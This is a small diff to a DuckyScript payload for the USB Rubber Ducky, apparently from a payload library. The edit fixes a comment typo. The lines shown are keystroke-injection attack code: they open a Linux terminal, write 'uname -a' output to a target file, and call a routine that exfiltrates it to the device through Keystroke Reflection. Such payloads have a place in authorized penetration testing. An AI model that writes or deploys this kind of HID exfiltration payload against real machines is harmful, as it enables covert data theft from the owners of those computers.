@@ -86,7 +86,7 @@ EXTENSION LINUX_HID_EXFIL
         REM Open Terminal
         CTRL ALT t
         DELAY 500
-        REM Perpare some data in TARGET_FILE
+        REM Prepare some data in #TARGET_FILE
         STRINGLN uname -a>#TARGET_FILE
         REM Exfil data to USB Rubber Ducky using Keystroke Reflection
         RUN_LINUX_EXFIL()
